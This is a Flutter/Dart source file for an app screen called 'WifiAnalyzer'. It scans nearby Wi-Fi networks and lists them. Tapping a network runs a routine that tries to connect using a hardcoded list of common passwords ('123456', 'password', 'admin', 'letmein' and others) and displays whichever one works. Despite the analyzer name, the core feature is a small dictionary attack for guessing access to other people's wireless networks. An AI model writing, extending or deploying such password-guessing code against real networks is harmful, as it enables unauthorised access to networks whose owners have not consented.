import 'package:flutter/material.dart';
import 'package:wifi/services/wifi_services.dart';
import 'package:wifi_scan/wifi_scan.dart';
import 'package:wifi_iot/wifi_iot.dart';

class WifiAnalyzer extends StatefulWidget {
  const WifiAnalyzer({super.key});

  @override
  State<WifiAnalyzer> createState() => _WifiAnalyzerState();
}

class _WifiAnalyzerState extends State<WifiAnalyzer> {
  final WifiServices _wifiServices = WifiServices();
  List<WiFiAccessPoint> networks = [];
  String password = "";

  @override
  void initState() {
    super.initState();
    loadWifi();
  }

  Future<void> loadWifi() async {
    final results = await _wifiServices.scanWifi();
    setState(() {
      networks = results;
    });
  }

  void _tryPassword(String ssid) async {
    List<String> possiblePassword = [
      "123456",
      "password",
      "admin",
      "letmein",
      "password1",
      "ambrodaa",
    ];

    for (String testPassword in possiblePassword) {
      bool connected = await WiFiForIoTPlugin.connect(
        ssid,
        password: testPassword,
        security: NetworkSecurity.WPA,
        joinOnce: false,
        withInternet: false
      );

      if (connected) {
        ScaffoldMessenger.of(
          context,
        ).showSnackBar(SnackBar(content: Text("Connected to $ssid with password $testPassword")));
        return;
      } else {
        debugPrint("Failed to connect");
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        child: networks.isEmpty
            ? const Center(child: CircularProgressIndicator())
            : ListView.builder(
                itemCount: networks.length,
                itemBuilder: (context, index) {
                  final wifi = networks[index];

                  return GestureDetector(
                    onTap: () => _tryPassword(wifi.ssid),
                    child: ListTile(
                      title: Text(
                        wifi.ssid.isEmpty ? "Hidden Network" : wifi.ssid,
                      ),
                      subtitle: Text("Signal: ${wifi.level} dBm"),
                    ),
                  );
                },
              ),
      ),
    );
  }
}
